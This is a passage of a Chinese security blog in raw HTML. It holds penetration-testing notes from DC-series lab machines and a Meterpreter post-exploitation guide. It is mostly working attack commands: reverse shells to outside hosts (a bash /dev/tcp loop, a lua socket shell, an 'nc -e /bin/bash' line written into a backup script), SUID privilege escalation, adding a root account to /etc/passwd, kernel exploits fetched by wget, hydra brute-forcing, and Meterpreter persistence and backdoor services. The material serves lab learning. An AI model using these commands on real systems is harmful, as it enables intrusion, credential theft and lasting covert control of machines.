class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \<span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br><span class="line"></span><br><span class="line"><span class="comment">#lua</span></span><br><span class="line">lua <span class="literal">-e</span> <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure>

<h3 id="3-提权姿势总结"><a href="#3-提权姿势总结" class="headerlink" title="3.提权姿势总结"></a><strong>3.提权姿势总结</strong></h3><p>一般提权方式可分为，漏洞提取和文件命令执行提取，下面介绍下本次靶机遇到的几种主要的文件命令提权：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#首先查找具有suid权限的文件，此类型文件执行时可以暂时获得root权限</span></span><br><span class="line">find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment">#假设find具有suid权限，可通过-exec执行脚本命令，从而获得root权限</span></span><br><span class="line">find test <span class="literal">-exec</span> <span class="string">'/bin/bash'</span> \;</span><br><span class="line"></span><br><span class="line"><span class="comment">#发现git具有suid权限时，</span></span><br><span class="line">sudo git help config ==》进入交互模式</span><br><span class="line">!/bin/sh ==&gt;反弹shell，从而获得root权限、</span><br><span class="line"></span><br><span class="line"><span class="comment">#发现nmap可以提权时，编写可执行脚本，进行反弹shell</span></span><br><span class="line">echo <span class="string">'os.execute("/bin/sh")'</span> &gt;  chj.nse  <span class="comment">#写入命令</span></span><br><span class="line">sudo nmap -<span class="literal">-script</span>=/home/jens/chj.nse</span><br><span class="line"></span><br><span class="line"><span class="comment">#vi提权，遇到shell受限制时，通过echo $PATH 、echo /home/xx/usr/bin/*查找可执行命令</span></span><br><span class="line">:set shell=/bin/sh	<span class="comment">#vi允许在其中执行脚本和命令，因此可以借此反弹shell提权</span></span><br><span class="line">:shell  </span><br><span class="line"></span><br><span class="line"><span class="comment">#遇到陌生的命令，建议先看下命令说明，找到相关参数，从而实现提权</span></span><br><span class="line">teehee <span class="literal">-h</span></span><br><span class="line">teehee <span class="literal">-a</span> <span class="comment">#可以写入文件内容而不覆盖</span></span><br><span class="line">echo <span class="string">"admin::0:0:::/bin/bash"</span> | sudo teehee <span class="literal">-a</span> /etc/passwd</span><br><span class="line"></span><br><span class="line">echo  <span class="string">"* * * * * root chmod 4777 /bin/sh"</span> | sudo teehee <span class="literal">-a</span> /etc/crontab</span><br><span class="line"><span class="comment">#切换admin用户，即拥有root权限</span></span><br></pre></td></tr></table></figure>

<p>利用漏洞提权：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Linux内核漏洞利用</span></span><br><span class="line">uname <span class="literal">-a</span> <span class="comment">#查看内核版本</span></span><br><span class="line">root@kali:~<span class="comment"># searchsploit ubuntu 16.04	 #查找相关poc</span></span><br><span class="line">root@kali:~<span class="comment"># cat ubuntu_v1604_shell.txt  #介绍exp使用方法</span></span><br><span class="line">An exploit that puts all this together is <span class="keyword">in</span> exploit.tar. Usage:</span><br><span class="line">user@host:~/ebpf_mapfd_doubleput<span class="variable">$</span> ./compile.sh</span><br><span class="line">user@host:~/ebpf_mapfd_doubleput<span class="variable">$</span> ./doubleput</span><br><span class="line"><span class="comment">#本地搭建web服务，方便靶机下载exp</span></span><br><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer 8000  #搭建http服务，提供文件浏览的web服务</span></span><br><span class="line">Serving HTTP on <span class="number">0.0</span>.<span class="number">0.0</span> port <span class="number">8000</span> ...</span><br><span class="line"><span class="variable">$</span> wget http://<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">8000</span>/exploit.tar <span class="comment">#下载文件</span></span><br><span class="line">tar <span class="literal">-xvf</span> exploit.tar</span><br><span class="line">cd ebpf_mapfd_doubleput_exploit</span><br><span class="line">./compile.sh </span><br><span class="line">./doubleput  </span><br><span class="line"></span><br><span class="line"><span class="comment">#本地文件漏洞利用，有时候可能存有一些可利用的文件</span></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-5</span>:~/html<span class="variable">$</span> find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null <span class="comment">#查看sudo权限</span></span><br><span class="line">/bin/screen<span class="literal">-4</span>.<span class="number">5.0</span>  <span class="comment">#发现了一个可能可以利用的文件</span></span><br><span class="line">root@kali:~<span class="comment"># searchsploit screen 4.5.0</span></span><br><span class="line">...  <span class="comment">#exp编写过程有点复杂，需要仔细看使用说明，上传到靶机后若无执行权限，记得添加</span></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-5</span>:/tmp<span class="variable">$</span> chmod +x <span class="number">41154</span>.sh</span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-5</span>:/tmp<span class="variable">$</span> ./<span class="number">41154</span>.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#同上</span></span><br><span class="line">root@kali:/var/www/html<span class="comment"># searchsploit exim</span></span><br><span class="line">Exim <span class="number">4.87</span> - <span class="number">4.91</span> - Local Privilege Escalation                                              | exploits/linux/local/<span class="number">46996</span>.sh</span><br></pre></td></tr></table></figure>

<p><strong>总结下此次靶场提权的思路，首先查看具有suid权限的文件是否可利用，如果无可用再查看内核版本是否有漏洞。</strong></p>
<h3 id="4-get-webshell思路"><a href="#4-get-webshell思路" class="headerlink" title="4.get webshell思路"></a><strong>4.get webshell思路</strong></h3><h4 id="4-1-信息收集"><a href="#4-1-信息收集" class="headerlink" title="4.1.信息收集"></a><strong>4.1.信息收集</strong></h4><p><strong>cms指纹识别—whatweb、火狐插件wappalyzer</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#whatweb用来时别cms信息比较快，支持批量导入，导出也可以以各种文件的形式</span></span><br><span class="line">whatweb ip</span><br><span class="line">whatweb <span class="literal">-i</span> /root/url.txt</span><br><span class="line">whatweb <span class="literal">-i</span> xx -<span class="literal">-log</span><span class="literal">-verbose</span>=xx.txt</span><br></pre></td></tr></table></figure>

<p><strong>后台路径爆破–Dirbuster、dirb命令</strong></p>
<p>dirbuster使用方法比较简单，主要是要有一个强大的字典，使用页面如下：</p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/28.png" alt></p>
<p>dirb的主要使用方式如下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">dirb  http://<span class="number">192.168</span>.<span class="number">126.33</span>  /usr/share/wordlists/dirb/big.txt <span class="comment">#kail自带字典</span></span><br><span class="line"><span class="comment">#-a 设置user-agent   -c 设置cookie</span></span><br><span class="line"><span class="comment">#User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器</span></span><br><span class="line"><span class="comment">#能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器插件等</span></span><br><span class="line">dirb http://<span class="number">192.168</span>.<span class="number">1.116</span> <span class="literal">-a</span> <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) </span></span><br><span class="line"><span class="string">Gecko/20100101 Firefox/75.0"</span>  <span class="literal">-c</span> <span class="string">"BAIDUID=D5C6351DAC89EF8811A..."</span></span><br><span class="line"></span><br><span class="line">dirb http://<span class="number">192.168</span>.<span class="number">1.116</span>  <span class="literal">-X</span> .dist <span class="literal">-z</span> <span class="number">100</span> <span class="literal">-o</span> test.txt</span><br><span class="line"><span class="comment">#-X 在每个字典的后面添加一个后缀  -z 添加毫秒延迟，避免洪水攻击</span></span><br><span class="line"><span class="comment">#-o 输出结果</span></span><br><span class="line"></span><br><span class="line">dirb http://<span class="number">192.168</span>.<span class="number">1.116</span>  <span class="literal">-p</span> <span class="number">46.17</span>.<span class="number">45.194</span>:<span class="number">5210</span> <span class="comment">#使用代理</span></span><br></pre></td></tr></table></figure>

<p>wpscan：<strong><code>WPScan</code>是一个扫描 <code>WordPress</code> 漏洞的黑盒子扫描器，能够扫描WordPress网站中的多种安全漏洞，其中包括WordPress本身的漏洞、插件漏洞和主题漏洞</strong></p>
<p><strong>该扫描器可以实现获取站点用户名，获取安装的所有插件、主题，以及存在漏洞的插件、主题，并提供漏洞信息。同时还可以实现对未加防护的<code>Wordpress</code>站点暴力破解用户名密码</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --url http://dc-2 -e vp #  u  #扫描存在用户</span></span><br><span class="line">root@kali:~<span class="comment"># wpscan --url http://dc-2 -U users.txt -P passwd.txt #破解用户密码</span></span><br><span class="line">wpscan -<span class="literal">-url</span> http://dc<span class="literal">-2</span> <span class="literal">-e</span> vp <span class="comment">#只枚举有漏洞的插件</span></span><br><span class="line">wpscan -<span class="literal">-url</span> http://dc<span class="literal">-2</span> <span class="literal">-e</span> vt <span class="comment">#扫描主题中存在的漏洞</span></span><br></pre></td></tr></table></figure>

<p>防御手段：</p>
<ul>
<li>使用<code>Block Bad Queries (BBQ)</code>插件，就可以屏蔽和禁止这类扫描（<strong>防范扫描插件、主题、TimThumb文件</strong>)</li>
<li>防止暴力破解的最好方式是限制一个<code>IP</code>地址的尝试登录次数</li>
</ul>
<p><strong>密码本制作–cewl</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cewl -w passwd.txt http://dc-2 # -w 字典存为文件</span></span><br><span class="line">root@kali:~<span class="comment"># cewl -w passwd.txt http://dc-2 -m 8 # -m 密码长度至少8位数</span></span><br><span class="line">cewl <span class="literal">-w</span> passwd.txt http://dc<span class="literal">-2</span> <span class="literal">-d</span> <span class="number">3</span> <span class="comment"># -d 增加深度获取更大的字典文件，默认为2</span></span><br></pre></td></tr></table></figure>

<h4 id="4-2-密码爆破"><a href="#4-2-密码爆破" class="headerlink" title="4.2.密码爆破"></a><strong>4.2.密码爆破</strong></h4><p>hydra是著名黑客组织thc的一款开源的暴力密码破解工具，可以在线破解多种密码，但是如果目标网站登录时候需要验证码就无法破解了</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-f 一对密码破解后终止 -vV详细过程 ，以post方式提交</span></span><br><span class="line">hydra <span class="literal">-l</span> admin <span class="literal">-P</span> ./rockyou.txt  <span class="operator">-f</span> <span class="number">192.168</span>.<span class="number">17.130</span>  http<span class="literal">-post</span><span class="literal">-form</span>   <span class="string">"/login.php:username=^USER^&amp;password=^PASS^:S=logout"</span> <span class="literal">-vV</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-L 用户名字典  -t 64 表示线程数 ssh破解</span></span><br><span class="line">hydra <span class="literal">-L</span> users.txt <span class="literal">-P</span> pswd.txt ssh://<span class="number">192.168</span>.<span class="number">126.149</span> <span class="literal">-t</span> <span class="number">64</span> <span class="operator">-f</span> <span class="literal">-v</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#以get方式提交</span></span><br><span class="line">hydra <span class="literal">-L</span> users.txt <span class="literal">-P</span> pswd.txt  <span class="operator">-f</span> <span class="number">192.168</span>.<span class="number">17.130</span>  http<span class="literal">-get</span> /admin/index.php</span><br><span class="line"></span><br><span class="line"><span class="comment">#破解https </span></span><br><span class="line">hydra <span class="literal">-m</span> /index.php <span class="literal">-l</span> muts <span class="literal">-P</span> pass.txt <span class="number">10.36</span>.<span class="number">16.18</span> https</span><br></pre></td></tr></table></figure>

<p>John the Ripper是一个快速的密码破解工具，用于在已知密文的情况下尝试破解出明文，支持目前大多数的加密算法，如DES、MD4、MD5等</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加密码本，后面是待破解的，需要花费的时间比较久</span></span><br><span class="line">john -<span class="literal">-wordlist</span>=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#john工具对于同一个shadow文件只会进行一次爆破，如果第二次执行john shadow是不会得到结果的</span></span><br><span class="line">john -<span class="literal">-show</span> password <span class="comment">#用此查看上一次爆破结果</span></span><br><span class="line">-<span class="literal">-format</span>=DES/MD5...  <span class="comment">#指定密文格式</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#快速时别hash加密方式</span></span><br><span class="line">hashid xxx</span><br></pre></td></tr></table></figure>

<h3 id="5-内网渗透技巧"><a href="#5-内网渗透技巧" class="headerlink" title="5.内网渗透技巧"></a><strong>5.内网渗透技巧</strong></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将靶机本地文件，发送到主机上</span></span><br><span class="line">scp ./old<span class="literal">-passwords</span>.bak root@<span class="number">192.168</span>.<span class="number">126.33</span>:/root/tools</span><br><span class="line"></span><br><span class="line"><span class="comment">#下载主机文件到靶机上</span></span><br><span class="line">攻击机：python <span class="literal">-m</span> SimpleHTTPServer <span class="number">8000</span></span><br><span class="line">靶机：wget http://<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">8000</span>/exploit.tar </span><br><span class="line"></span><br><span class="line"><span class="comment">#写入脚本到文件中</span></span><br><span class="line">echo <span class="string">"nc -e /bin/bash 192.168.126.33 2222"</span> &gt;&gt; backups.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#交互显示</span></span><br><span class="line">python <span class="literal">-c</span> <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>


      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/" rel="tag">渗透工具</a></li></ul>


    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-Metasploit" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/09/11/Metasploit/"
    >Metasploit</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/09/11/Metasploit/" class="article-date">
  <time datetime="2020-09-11T10:55:45.000Z" itemprop="datePublished">2020-09-11</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <p>主要介绍下Meterpreter攻击载荷模块</p>
<h2 id="1-常用命令"><a href="#1-常用命令" class="headerlink" title="1.常用命令"></a><strong>1.常用命令</strong></h2><table>
<thead>
<tr>
<th align="center"><strong>background</strong></th>
<th align="center"><strong>将meterpreter隐藏在后台</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>sessions</strong></td>
<td align="center"><strong>查看已经成功获取的会话</strong></td>
</tr>
<tr>
<td align="center"><strong>quit</strong></td>
<td align="center"><strong>关闭meterpreter会话返回msf</strong></td>
</tr>
</tbody></table>
<p><strong><img src="/2020/09/11/Metasploit/1.png" alt></strong></p>
<h3 id="1-1文件系统命令"><a href="#1-1文件系统命令" class="headerlink" title="1.1文件系统命令"></a><strong>1.1文件系统命令</strong></h3><table>
<thead>
<tr>
<th align="center"><strong>getwd</strong></th>
<th align="center"><strong>目标机当前的工作目录</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>getlwd</strong></td>
<td align="center"><strong>当前系统的工作目录</strong></td>
</tr>
<tr>
<td align="center"><strong>upload</strong></td>
<td align="center"><strong>上传文件到目标机器</strong></td>
</tr>
<tr>
<td align="center"><strong>download</strong></td>
<td align="center"><strong>从目标机器上下载文件（注意路径符号）</strong></td>
</tr>
<tr>
<td align="center"><strong>edit</strong></td>
<td align="center"><strong>调用vi对目标机的文件进行编辑</strong></td>
</tr>
<tr>
<td align="center"><strong>search  -h</strong></td>
<td align="center"><strong>文件搜索</strong></td>
</tr>
</tbody></table>
<p><img src="/2020/09/11/Metasploit/2.png" alt></p>
<h3 id="1-2-网络命令"><a href="#1-2-网络命令" class="headerlink" title="1.2 网络命令"></a><strong>1.2 网络命令</strong></h3><p><strong>portfwd是端口转发命令，假设3389只允许内网访问，可用此命令进行端口转发，从而能直接访问目标主机</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmic RDTOGGLE WHERE ServerName=<span class="string">'%COMPUTERNAME%'</span> call SetAllowTSConnections <span class="number">1</span>  <span class="comment">#开启3389</span></span><br><span class="line">portfwd add <span class="literal">-l</span> <span class="number">1234</span> <span class="literal">-p</span> <span class="number">3389</span> <span class="literal">-r</span> <span class="number">192.168</span>.xx.xx</span><br><span class="line">root@kali:~/tools<span class="comment"># rdesktop -u admin -p 1234 127.0.0.1:1234</span></span><br><span class="line">route <span class="comment">#显示主机路由信息</span></span><br></pre></td></tr></table></figure>

<h3 id="1-3-系统命令"><a href="#1-3-系统命令" class="headerlink" title="1.3 系统命令"></a><strong>1.3 系统命令</strong></h3><table>
<thead>
<tr>
<th align="center"><strong>ps</strong></th>
<th align="left"><strong>显示目标主机上的进程</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>migrate    304</strong></td>
<td align="left"><strong>可以将meterpreter会话从一个进程移植到另一个进程的内存空间（避免用户关闭进程终止会话连接，可以将进程移植到稳定的系统服务进程中，不需要断开已有的tcp连接） 这里的304是指进程的pid</strong></td>
</tr>
<tr>
<td align="center"><strong>getpid</strong></td>
<td align="left"><strong>获取当前会话所在进程的PID值</strong></td>
</tr>
<tr>
<td align="center"><strong>getuid</strong></td>
<td align="left"><strong>查看当前具有的权限</strong></td>
</tr>
<tr>
<td align="center"><strong>kill 1840</strong></td>
<td align="left"><strong>结束目标进程</strong></td>
</tr>
<tr>
<td align="center"><strong>sysinfo</strong></td>
<td align="left"><strong>查看目标系统信息</strong></td>
</tr>
<tr>
<td align="center"><strong>shutdown</strong></td>
<td align="left"><strong>关闭目标主机</strong></td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; execute -H -f cmd.exe  #隐藏执行cmd.exe程序</span><br><span class="line">Process 2076 created.</span><br><span class="line">meterpreter &gt; execute -H -i -f   cmd.exe   #进行交互    </span><br><span class="line">Process 2740 created.                          </span><br><span class="line">Channel 1 created.                                                                     </span><br><span class="line">C:\&gt;whoami                                     </span><br><span class="line">execute -H -m -d normal.exe -f wce.exe -a "-o foo.txt" #wce.exe是攻击机上的可执行文件，后面是参数</span><br><span class="line"><span class="meta">#</span><span class="bash">-H 表示隐藏执行，-d 表示伪装在目标机器上的进程，-m支持直接从内存中执行攻击端的文件</span></span><br></pre></td></tr></table></figure>

<h2 id="2-后渗透攻击模块"><a href="#2-后渗透攻击模块" class="headerlink" title="2.后渗透攻击模块"></a><strong>2.后渗透攻击模块</strong></h2><p>主要步骤如下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_http</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_http                                                                                                                               </span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost <span class="number">192.168</span>.<span class="number">126.33</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span>.<span class="number">126.33</span>                                                                                                                                                   </span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport <span class="number">1234</span>                                                                                                                              </span><br><span class="line">lport =&gt; <span class="number">1234</span>                                                                                                                                                             </span><br><span class="line">msf5 exploit(multi/handler) &gt; run                                                                                                                                                                                                                                                                                                                 </span><br><span class="line">[*] Started HTTP reverse handler on http://<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">1234</span>                                                                                                            </span><br><span class="line">[*] http://<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">1234</span> handling request from <span class="number">192.168</span>.<span class="number">126.151</span>; (UUID: fop9sg                                                                                       hd) Staging x86 payload (<span class="number">181337</span> bytes) ...                                                                                                                                </span><br><span class="line">[*] Meterpreter session <span class="number">1</span> opened (<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">1234</span> -&gt; <span class="number">192.168</span>.<span class="number">126.151</span>:<span class="number">1087</span>) at <span class="number">2</span>                                                                                       <span class="number">020</span><span class="literal">-09</span><span class="literal">-12</span> <span class="number">14</span>:<span class="number">26</span>:<span class="number">29</span> +<span class="number">0800</span>                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">meterpreter &gt; arp<span class="literal">-a</span></span><br></pre></td></tr></table></figure>



<p>通过Persistence与metsvc等后渗透攻击模块，在目标主机上安装自启动和永久服务的方式，可以长久的控制目标主机！</p>
<h3 id="2-1-persistence后渗透攻击模块"><a href="#2-1-persistence后渗透攻击模块" class="headerlink" title="2.1 persistence后渗透攻击模块"></a><strong>2.1 persistence后渗透攻击模块</strong></h3><p>运行后，会在目标主机的注册表键中添加键值，达到自启动的目的</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run persistence <span class="literal">-X</span> <span class="literal">-i</span> <span class="number">5</span> <span class="literal">-p</span> <span class="number">443</span> <span class="literal">-r</span> <span class="number">192.168</span>.<span class="number">126.33</span></span><br><span class="line"><span class="comment">#-X 表示开机自启动，-i表示反向连接的间隔时间</span></span><br><span class="line">[!] Meterpreter scripts are deprecated. <span class="keyword">Try</span> exploit/windows/local/persistence.</span><br><span class="line">[!] Example: run exploit/windows/local/persistence OPTION=value [<span class="type">...</span>]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file <span class="keyword">for</span> cleanup created at /root/.msf4/logs/persistence/STU1_20200912.<span class="number">0938</span>/STU1_20200912.<span class="number">0938</span>.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">126.33</span> LPORT=<span class="number">443</span></span><br><span class="line">[*] Persistent agent script is <span class="number">99613</span> bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\ADMINI~<span class="number">1</span>\AppData\Local\Temp\jveynIXzUsxp.vbs</span><br><span class="line">[*] Executing script C:\Users\ADMINI~<span class="number">1</span>\AppData\Local\Temp\jveynIXzUsxp.vbs</span><br><span class="line">[+] Agent executed with PID <span class="number">1832</span></span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\AcgmcGcp</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\AcgmcGcp</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 192.168.126.33</span><br><span class="line">lhost =&gt; 192.168.126.33</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 443</span><br><span class="line">lport =&gt; 443</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.126.33:443 </span><br><span class="line">[*] Sending stage (180291 bytes) to 192.168.126.151</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.126.33:443 -&gt; 192.168.126.151:1440) at 2020-09-12 16:49:24 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sysinfo </span><br><span class="line">Computer        : STU1</span><br><span class="line">OS              : Windows 7 (6.1 Build 7601, Service Pack 1).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : GOD</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x86/windows</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-metsvc后渗透攻击模块"><a href="#2-2-metsvc后渗透攻击模块" class="headerlink" title="2.2 metsvc后渗透攻击模块"></a><strong>2.2 metsvc后渗透攻击模块</strong></h3><p>主要是在目标主机的31337端口开启后门监听服务，并上传3个meterpreter模块</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run metsvc </span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. <span class="keyword">Try</span> exploit/windows/local/persistence.</span><br><span class="line">[!] Example: run exploit/windows/local/persistence OPTION=value [<span class="type">...</span>]</span><br><span class="line">[*] Creating a meterpreter service on port <span class="number">31337</span></span><br><span class="line">[*] Creating a temporary installation directory C:\Users\ADMINI~<span class="number">1</span>\AppData\Local\Temp\dpcuvwyl...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc<span class="literal">-server</span>.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">         * Installing service metsvc</span><br><span class="line"> * Starting service</span><br><span class="line">Service metsvc successfully installed.</span><br></pre></td></tr></table></figure>

